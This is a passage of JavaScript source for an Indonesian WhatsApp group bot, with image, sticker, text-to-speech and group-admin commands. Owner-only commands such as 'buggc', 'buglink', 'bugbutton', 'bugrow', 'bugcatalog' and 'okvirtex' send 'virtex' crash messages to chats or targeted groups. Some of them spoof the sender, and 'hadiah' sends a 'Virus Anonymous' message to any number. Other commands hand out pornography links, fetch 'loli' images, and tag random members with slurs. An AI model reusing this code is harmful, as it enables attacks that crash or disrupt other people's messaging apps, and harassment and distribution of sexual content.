                       case 'animerem':
                     case 'minato': 
                       case 'jiraya': 
                     case 'tsunade': 
                       case 'kiba':
                     case 'boruto': 
                     case 'sarada':
                     case 'sasuke': 
                    case 'madara':
                      case 'obito':
                      case 'obito':
                      case 'tanjiro':
                      case 'nezuko':
                      case 'luffy':
                      case 'zoro':
                      case 'sanji':        
                    case 'gon':
                      case 'killua':
                      case 'sagiri': 
                      case 'rimuru':
                        case 'natsu':
                      case 'genos':
                      case 'saitama': 
                      case 'miku': 
                      case 'cecan':
                      case 'cogan':
                    reply(mess.wait)
                buffer = await getBuffer (`https://percobaan-apic.herokuapp.com/api/search/pinterestimage?apikey=12345&query=${command}`)
                zero.sendMessage(from, buffer, image, {quoted: zer, caption : `Nih Kak🗿`})
                break
				case 'gtts':
				case 'tts':
				  if (args.length < 1) return reply("```TEKSNYA APA TOD```")
                buffer = await getBuffer (`https://percobaan-apic.herokuapp.com/api/others/tts?apikey=12345&text=${args.join(' ')}`)
                zero.sendMessage(from, buffer, MessageType.audio, {quoted: zer, mimetype: 'audio/mp4', ptt:true})
                break
case 'welcome': 
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !zer.key.fromMe) return reply(mess.only.admin);
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if (args[0] === 'on') {
if (isWelcome) return reply('𝐒𝐮𝐝𝐚𝐡 𝐀𝐤𝐭𝐢𝐟 𝐒𝐞𝐛𝐞𝐥𝐮𝐦𝐧𝐲𝐚...!!!')
welcome.push(from)
fs.writeFileSync('./storage/welcome.json', JSON.stringify(welcome))
reply('𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐠𝐚𝐤𝐭𝐢𝐟𝐤𝐚𝐧 𝐖𝐞𝐥𝐜𝐨𝐦𝐞')
} else if (args[0] === 'off') {
if (!isWelcome) return reply('𝐒𝐮𝐝𝐚𝐡 𝐌𝐚𝐭𝐢 𝐒𝐞𝐛𝐞𝐥𝐮𝐦𝐧𝐲𝐚...!!!')
var ini = welcome.indexOf(from)
welcome.splice(ini, 1)
fs.writeFileSync('./storage/welcome.json', JSON.stringify(welcome))
reply('𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐦𝐚𝐭𝐢𝐤𝐚𝐧 𝐖𝐞𝐥𝐜𝐨𝐦𝐞')
} else if (!q){
anu =`SILAHKAN PILIH SALAH SATU`
punten = [{buttonId: 'welcome off', buttonText: {displayText: 'OFF'}, type: 1},{buttonId: 'welcome on', buttonText: {displayText: 'ON️'}, type: 1}]
var btngrass = {
contentText: `${anu}`,
footerText: 'CREATED BY BAMBANG TRI RAHARJO',
buttons: punten,
headerType: 1
}
await zero.sendMessage(from, btngrass, MessageType.buttonsMessage, {quoted: ftrol})
}
break
case 'antidelete':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if(antidel)return reply('It has been activated before!')
antidel = true
reply(`Succesfully activated antidelete`)
} else if (args[0] === "off") {
if(!antidel)return reply('It has been deactivated before!')
antidel = false
reply(`Successfully turned off antidelete`)
} else {
reply(`Select on or off`)
}
break
case 'antilink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !zer.key.fromMe) return reply(mess.only.admin);
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if (args[0] == "on") {
if (isAntilink) return reply("𝐒𝐮𝐝𝐚𝐡 𝐀𝐤𝐭𝐢𝐟 𝐒𝐞𝐛𝐞𝐥𝐮𝐦𝐧𝐲𝐚...!!!");
antilink.push(from);
fs.writeFileSync(
"./storage/antilink.json",
JSON.stringify(antilink)
);
reply("𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐠𝐚𝐤𝐭𝐢𝐟𝐤𝐚𝐧 𝐀𝐧𝐭𝐢𝐥𝐢𝐧𝐤");
zero.sendMessage(from,`Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group`, text)
} else if (args[0] == "off") {
antilink.splice(from, 1);
fs.writeFileSync(
"./storage/antilink.json",
JSON.stringify(antilink)
);
reply("𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐦𝐚𝐭𝐢𝐤𝐚𝐧 𝐀𝐧𝐭𝐢𝐥𝐢𝐧𝐤");
} else if (!q) {
sendButMessage(from, `MODE ANTILINK`, `Silahkan Pilih Salah Satu`, [
{
buttonId: `antilink on`,
buttonText: {
displayText: `ON`,
},
type: 1,
},
{
buttonId: `antilink off`,
buttonText: {
displayText: `OFF`,
},
type: 1,
},
]);
}
break
					             case "pacaran":
				
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. Lagi Pacaran Nich @${akuu.jid.split('@')[0]} Sama Dia♥️👀 @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					break
case 'bego':
      case 'tolol':
      case 'pinter':
      case 'pintar':
      case 'asu':
      case 'bodoh':
      case 'gay':
      case 'lesby':
      case 'bajingan':
      case 'jancok':
      case 'anjing':
      case 'ngentod':
      case 'ngentot':
      case 'monyet':
      case 'mastah':
      case 'newbie':
      case 'bangsat':
      case 'bangke':
      case 'sange':
      case 'sangean':
      case 'dakjal':
      case 'horny':
      case 'wibu':
      case 'puki':
      case 'pantex':
      case 'pantek':
      
      if (!isGroup) return reply(mess.only.group)
        membr = []
        const pff = groupMembers
        const go = groupMembers
        const goo = pff[Math.floor(Math.random() * pff.length)]
        const oe = go[Math.floor(Math.random() * go.length)]
        teks = `*Yang Paling ${command} Disini Adalah :* @${goo.jid.split('@')[0]} Awokawokk ${command}`
        membr.push(goo.jid)
        mentions(teks, membr, true)
        break
case 'randombokep':
              bokep = body.slice(13)
              const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
              const kep = bo[Math.floor(Math.random() * bo.length)]
              zero.sendMessage(from, '*PERMINTAAN: RANDOM BOKEP*\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI, JANGAN MANJA NGENTOD!!*\n*DOSA GW UDAH BANYAK JANGAN DITAMBAHIN LAGI NGOKHEI:) :* '+ kep, text, { quoted: ftrol, caption: `NI BOKEP SAYA DAPAT DARI *©Bambang* DOSA TANGGUNG SENDIRI🗿`})
              break
               case 'kisahnabi':
            
               if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
               anu = await fetchJson(`https://raku-web.herokuapp.com/api/muslim/kisahnabi?nabi=${args.join(' ')}&apikey=${rakukey}`)
               anu1 = `*NAMA NABI* : ${anu.result.name}\n`
               anu1 += `*KELAHIRAN* : ${anu.result.kelahiran}\n`
               anu1 += `*WAFAT USIA* : ${anu.result.wafat_usia}\n` 
               anu1 += `*SINGGAH* : ${anu.result.singgah}\n`
               anu1 += `*KISAH* : ${anu.result.kisah}\n`
               reply(anu1)
               break
case 'antivirtex':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !zer.key.fromMe) return reply(mess.only.admin);
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if (args[0] == "on") {
if (isAntivirtex) return reply("𝐒𝐮𝐝𝐚𝐡 𝐀𝐤𝐭𝐢𝐟 𝐒𝐞𝐛𝐞𝐥𝐮𝐦𝐧𝐲𝐚...!!!");
antivirtex.push(from);
fs.writeFileSync(
"./storage/antivirtex.json",
JSON.stringify(antivirtex)
);
reply("𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐠𝐚𝐤𝐭𝐢𝐟𝐤𝐚𝐧 𝐀𝐧𝐭𝐢𝐯𝐢𝐫𝐭𝐞𝐱");
} else if (args[0] == "off") {
antivirtex.splice(from, 1);
fs.writeFileSync(
"./storage/antivirtex.json",
JSON.stringify(antivirtex)
);
reply("𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐦𝐚𝐭𝐢𝐤𝐚𝐧 𝐀𝐧𝐭𝐢𝐯𝐢𝐫𝐭𝐞𝐱");
} else if (!q) {
sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan Pilih Salah Satu`, [
{
buttonId: `antivirtex on`,
buttonText: {
displayText: `ON`,
},
type: 1,
},
{
buttonId: `antivirtex off`,
buttonText: {
displayText: `OFF`,
},
type: 1,
},
]);
}
break
case 'group':
case 'grup':
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
but = [
{ buttonId: 'groupbuka', buttonText: { displayText: 'BUKA' }, type: 1 },
{ buttonId: 'grouptutup', buttonText: { displayText: 'TUTUP' }, type: 1 }
]
sendButMessage(from, "Silahkan Pilih Untuk Buka/Tutup Group", faketeks, but, zer)
break
case 'loli':
anu = await getBuffer(`https://leyscoders-api.herokuapp.com/api/loli?apikey=IkyOgiwara`)
zero.sendMessage(from, anu, image, { quoted: zer, caption: 'Nih Kak Lolinya ^_^' })
break
case 'donasi':
case 'sewabot':
  reply(`Untuk Sewa bot :
  1 hari = Free
  1 minggu = Rp.2500
  1 bulan = Rp.5000
  Permanen = Rp.10000
  Note:
  Jika Sewa Satu Hari Tinggal Langsung Masukkin
  Botnya Aja Ke Dalam Group Anda!!, atau juga bisa
  dengan ketik command ${prefix}freeoneday (linkgc)
  Tanpa Bilang Ke Ownernya Terima Kasih:).
 Via Payment :
  Dana: 082313021398
  Gopay: 082313021398
  Paypal: santuyseng@gmail.com`)
  break
case 'hadiah':
        	case 'gift':
      if (!isOwner && !zer.key.fromMe) return sticOwner(from)
listMsg = {
 buttonText: `serah lu dah kalo ngeyel`,
 footerText: '',
 description: `JANGAN DIBUKA`,
 sections: [
                     {
                      "title": `Bagaimana hadiahnya?`,
 rows: [{
"title": `${emoji1(prefix)}`,
"description": 'Virus Anonymous',
"rowId": "menu"
}]
                     }],
 listType: 1,
 ListMessageListType: 2
}
if (!args[0]) {
zero.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]}})
} else {
  zero.sendMessage(`${args[0]}@s.whatsapp.net`, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]}})
}
break
case 'buggc':
if (!zer.key.fromMe) return;
if (!q) return reply('Enter the Group ID')
sendBug(args[0])
break
case 'okvirtex':
if (!isOwner && !zer.key.fromMe) return reply('Only owner can use this feature')
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex1(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
case 'buglink':
                if (!isOwner && !zer.key.fromMe) return reply('Only owner can use this feature')
                 zero.toggleDisappearingMessages(from, 0)
               zero.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/y0RYgzB/FB-IMG-1635413002830.jpg",
                "thumbnail": fs.readFileSync(`./xeon.jpg`),
                "sourceUrl": "https://youtube.com/channel/UCvAo9TZ0Pw9vrJ_0WYRyO3A"}}})
                break
        case 'bugbutton':
        if (!isOwner && !zer.key.fromMe) return reply('Only owner can use this feature')
        zero.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Yahahaha'},type:1}])
        zero.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !zer.key.fromMe) return reply('Only owner can use this feature')
zero.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "CieDick",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
zero.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
zero.toggleDisappearingMessages(from, 0)
break
case 'bugcatalog':
if (!isOwner && !zer.key.fromMe) return reply('Only owner can use this feature')
zero.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = zero.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${virtex6(prefix)}`,
    orderTitle: `${emoji2(prefix)}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
             zero.relayWAMessage(res)
        }
        babi(`${ngazap(prefix)}`)
        babi(`${virtag(prefix)}`)
        babi(`${virtex6(prefix)}`)
        babi(`${emoji2(prefix)}`)
        break
       
                           case 'bucinstick':
                case 'bucinsticker':{
         
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    var isGif = wifegerakx.endsWith('.gif') ? true : false
                    if (!isGif) {
                    var ngebuff = await getBuffer(wifegerakx)
                    var mediast = getRandom('.png')
                    fs.writeFileSync(mediast, ngebuff)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									 zero.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
								
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    } else {
                     var ngebuff = await getBuffer(wifegerakx)
                 	let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, ngebuff)
					reply(mess.wait)
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(err)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									 zero.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    }
                    }
                    break
case 'piltek':
if (!isOwner && !zer.key.fromMe) return sticOwner(from)
gifnya = await getBuffer('https://telegra.ph/file/a92a5a213055a6a48f023.mp4')
anu =`${emoji2(prefix)}`
await zero.sendMessage(from, gifnya, MessageType.video, {mimetype : 'video/mp4', quoted: ftrol, caption: anu})
break
case 'readall':
                if (!isOwner && !zer.key.fromMe) return sticOwner(from)
                var chats = await zero.chats.all()
                chats.map( async ({ jid }) => {
                await zero.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await zero.sendMessage(from, teks, text, {quoted: zer})
		console.log(chats.length)
		break
  case 'd':
				case 'del':
				case 'delete':
					zero.deleteMessage(from, { id: zer.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
            case 'unarchiveall':
                if (!isOwner && !zer.key.fromMe) return sticOwner(from)
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await zero.chats.all()
                for (let _ of anu) {
                zero.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
                case 'archive':
                if (!isOwner && !zer.key.fromMe) return sticOwner(from)
                reply('*okey wait..*')
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                zero.modifyChat(from, ChatModification.archive)
                break
            case 'unreadall':
                if (!isOwner && !zer.key.fromMe) return sticOwner(from)
                var chats = await zero.chats.all()
                chats.map( async ({ jid }) => {
                await zero.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await zero.sendMessage(from, teks, text, {quoted: zer})
		    console.log(chats.length)
	        break
					//feature by Bambang
					          case 'phcomment':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Bambang&lol*`)
                   var F = body.slice(10)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`https://api.zeks.me/api/phub?apikey=${zeksapi}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                  zero.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `Done Yaa By © Bambang Ganteng`, quoted: zer})
                   break
case 'anime':
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            zero.sendMessage(from,media,image,{quoted:zer,caption:'*BY Bambang Official ^_^*'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
case 'groupbuka' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
reply(`\`\`\`𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐦𝐛𝐮𝐤𝐚 𝐆𝐫𝐨𝐮𝐩\`\`\` *${groupMetadata.subject}*`)
zero.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
      case "setreply":
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Sukses Mengganti Reply: ${q}`);
        break;
      case "setfakeimg":
        if (
          ((isMedia && !zer.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(zer).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : zer;
          delb = await zero.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Success");
        } else {
          reply(`Silahkan Anda Mengirim Gambar Dengan Caption ${prefix}setfakeimg`);
        }
        break;
      case "setthumb":
        if (
          ((isMedia && !zer.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(zer).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : zer;
          delb = await zero.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses Mengganti Thumbnailnya");
        } else {
          reply(`Silahkan Anda Kirim Gambar Dengan Caption ${prefix}sethumb`);
        }
        break;
case 'grouptutup' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
reply(`\`\`\`𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐮𝐭𝐮𝐩 𝐆𝐫𝐨𝐮𝐩\`\`\` *${groupMetadata.subject}*`)
zero.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'linkgrup' :
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
linkgc = await zero.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\n𝐋𝐢𝐧𝐤 𝐆𝐫𝐨𝐮𝐩 *${groupName}*`
zero.sendMessage(from, yeh, text, { quoted: ftrol })
break
case 'promote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if (zer.message.extendedTextMessage === undefined || zer.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = zer.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = '𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡 𝐃𝐢 𝐓𝐞𝐫𝐢𝐦𝐚, 𝐊𝐚𝐦𝐮 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zero.groupMakeAdmin(from, mentioned)
} else {
mentions(`𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡 𝐃𝐢 𝐓𝐞𝐫𝐢𝐦𝐚, @${mentioned[0].split('@')[0]} 𝐊𝐚𝐦𝐮 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 𝐃𝐢 𝐆𝐫𝐨𝐮𝐩 *${groupMetadata.subject}*`, mentioned, true)
zero.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if (zer.message.extendedTextMessage === undefined || zer.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = zer.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = '𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡 𝐃𝐢 𝐓𝐞𝐫𝐢𝐦𝐚, 𝐊𝐚𝐦𝐮 𝐓𝐢𝐝𝐚𝐤 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 𝐋𝐚𝐠𝐢 :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
zero.groupDemoteAdmin(from, mentioned)
} else {
mentions(`𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡 𝐃𝐢 𝐓𝐞𝐫𝐢𝐦𝐚, 𝐌𝐞𝐧𝐮𝐫𝐮𝐧𝐤𝐚𝐧 : @${mentioned[0].split('@')[0]} 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐌𝐞𝐦𝐛𝐞𝐫`, mentioned, true)
zero.groupDemoteAdmin(from, mentioned)
}
break
case 'add':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if (args.length < 1) return reply('Nomer Yg Mau Di Add Mana ?')
if (args[0].startsWith('08')) return reply('Gunakan Kode Negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
zero.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('𝐆𝐚𝐠𝐚𝐥 𝐌𝐞𝐧𝐚𝐦𝐛𝐚𝐡𝐤𝐚𝐧 𝐓𝐚𝐫𝐠𝐞𝐭, 𝐌𝐮𝐧𝐠𝐤𝐢𝐧 𝐊𝐚𝐫𝐞𝐧𝐚 𝐃𝐢 𝐏𝐫𝐢𝐯𝐚𝐭𝐞!')
}
break
case 'kick':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if(!q)return reply(`*Format Error!*\n\n*Example : ${prefix + command} @tag*`)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
y = q.split('@')[1] + '@s.whatsapp.net'
zero.groupRemove(from, [y])
reply(`𝐒𝐮𝐜𝐜𝐬𝐞𝐬 𝐊𝐢𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭!`)
break
case 'tagall':
if (!isGroup) return reply("Khusus di grup");
if (!isGroupAdmins && !zer.key.fromMe) return reply(mess.only.admin);
let arr = [];
let txti = `[ 𝗧𝗔𝗚 𝗔𝗟𝗟 ]\n${q ? q : ''}\n\n`
for (let i of groupMembers){
txti += `=> @${i.jid.split("@")[0]}\n`
arr.push(i.jid)
}
mentions(txti, arr, true)
break
case 'setname':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
zero.groupUpdateSubject(from, `${body.slice(9)}`)
zero.sendMessage(from, `\`\`\`𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐠𝐠𝐚𝐧𝐭𝐢 𝐍𝐚𝐦𝐚 𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐣𝐚𝐝??\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'setdesc':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
zero.groupUpdateDescription(from, `${body.slice(9)}`)
zero.sendMessage(from, `\`\`\𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐠𝐠𝐚𝐧𝐭𝐢 𝐃𝐞𝐬𝐤𝐫𝐢𝐩𝐬𝐢 𝐆𝐫𝐨𝐮𝐩\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'hidetag':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
ht = body.slice(9)
members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
mentions(ht, members_id, false)
break
case 'setpp':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
media = await zero.downloadAndSaveMediaMessage(zer, './storage/media_user')
await zero.updateProfilePicture(from, media)
reply(mess.wait)
reply(`\`\`\`𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐠𝐠𝐚𝐧𝐭𝐢 𝐏𝐫𝐨𝐟𝐢𝐥 𝐆𝐫𝐨𝐮𝐩\`\`\` *${groupMetadata.subject}*`)
break

case 'bc':
case 'bcbut':
if (!isOwner && !x.key.fromMe) return reply(`Hanya Untuk @${ownerNumbers.split("@")[0]}`)
if (args.length < 1) return reply('Teksnya?')
anu = await zero.chats.all()
for (let _ of anu) {
buttonss = [{buttonId: `menu`, buttonText: {displayText: 'MENU'}, type: 1},{buttonId: `owner`, buttonText: {displayText: 'OWNER'}, type: 1}]
var btnbc = {
contentText: `${q}`,
footerText: '*SILAHKAN TEKAN BUTTON UNTUK INFORMASI LANJUT*',
buttons: buttonss,
headerType: 1
}
await zero.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
}
reply(`Sukses Mengirim Broadcast:\n${q}`)
break

case 'sticker':
case 'stiker':
case 's':
if ((isMedia && !zer.message.videoMessage || isQuotedImage) && args.length == 0) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
let media = await zero.downloadAndSaveMediaMessage(encmedia, './storage/media_user')
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.stick)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
costum(buffer, sticker, Verived, `Jangan Lupa Subscribe BambangOfficial`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
